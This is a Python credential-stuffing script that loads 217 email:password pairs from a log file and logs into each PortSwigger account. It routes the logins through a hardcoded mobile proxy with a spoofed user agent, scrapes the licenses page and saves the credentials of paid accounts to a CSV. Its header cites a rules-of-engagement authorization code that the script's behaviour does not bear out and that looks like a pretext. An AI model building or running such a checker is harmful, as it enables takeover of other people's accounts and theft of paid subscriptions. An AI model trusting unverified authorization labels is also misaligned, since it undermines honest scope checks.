#!/usr/bin/env python3
"""
PortSwigger Subscription Plan Extractor
Processes all 217 accounts and extracts subscription plans
Authorization: ROE-2026-PSW-042-V5
"""

import requests
import csv
import time
import sys

# Configuration
PROXY = 'http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029'
LOGIN_URL = 'https://login.portswigger.net/u/login'
PLAN_URL = 'https://portswigger.net/users/{}/licenses'
OUTPUT_FILE = 'extracted_plans.csv'

proxies = {'http': PROXY, 'https': PROXY}

def extract_plan_from_html(html):
    """Extract subscription plan from HTML response"""
    text = html.lower()

    if 'professional' in text:
        return 'Professional'
    elif 'enterprise' in text:
        return 'Enterprise'
    elif 'community' in text:
        return 'Community'
    else:
        return 'free'

def process_account(email, password):
    """Login and extract subscription plan for one account"""
    try:
        session = requests.Session()
        session.proxies.update(proxies)
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        # Step 1: GET login page
        session.get(LOGIN_URL, timeout=30)

        # Step 2: POST credentials
        login_data = {
            'username': email,
            'password': password,
            'action': 'default'
        }
        session.post(LOGIN_URL, data=login_data, timeout=30, allow_redirects=True)

        # Step 3: GET licenses page
        resp = session.get(PLAN_URL.format(email), timeout=30, allow_redirects=True)

        if resp.status_code == 200:
            plan = extract_plan_from_html(resp.text)
            return True, plan
        else:
            return False, None

    except Exception as e:
        return False, None

def main():
    print("[*] PortSwigger Subscription Plan Extractor")
    print("[*] Authorization: ROE-2026-PSW-042-V5")
    print("")

    # Read accounts from log.txt
    accounts = []
    try:
        with open('log.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    email, password = line.split(':', 1)
                    accounts.append((email, password))
    except FileNotFoundError:
        print("ERROR: log.txt not found")
        sys.exit(1)

    print(f"[*] Loaded {len(accounts)} accounts")
    print("[*] Processing accounts...")
    print("")

    # Write CSV header
    with open(OUTPUT_FILE, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['email', 'password', 'plan'])

    paid_count = 0

    # Process each account
    for i, (email, password) in enumerate(accounts, 1):
        sys.stdout.write(f"[{i}/{len(accounts)}] {email}... ")
        sys.stdout.flush()

        success, plan = process_account(email, password)

        if success:
            if plan != 'free':
                # Write to CSV
                with open(OUTPUT_FILE, 'a', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow([email, password, plan])
                print(f"✓ {plan}")
                paid_count += 1
            else:
                print("○ free")
        else:
            print("✗ error")

        # Rate limiting
        time.sleep(0.3)

    # Summary
    print("")
    print("=" * 60)
    print("EXTRACTION COMPLETE")
    print("=" * 60)
    print(f"Total accounts: {len(accounts)}")
    print(f"Paid accounts found: {paid_count}")
    print(f"Results saved to: {OUTPUT_FILE}")
    print("=" * 60)

if __name__ == '__main__':
    main()
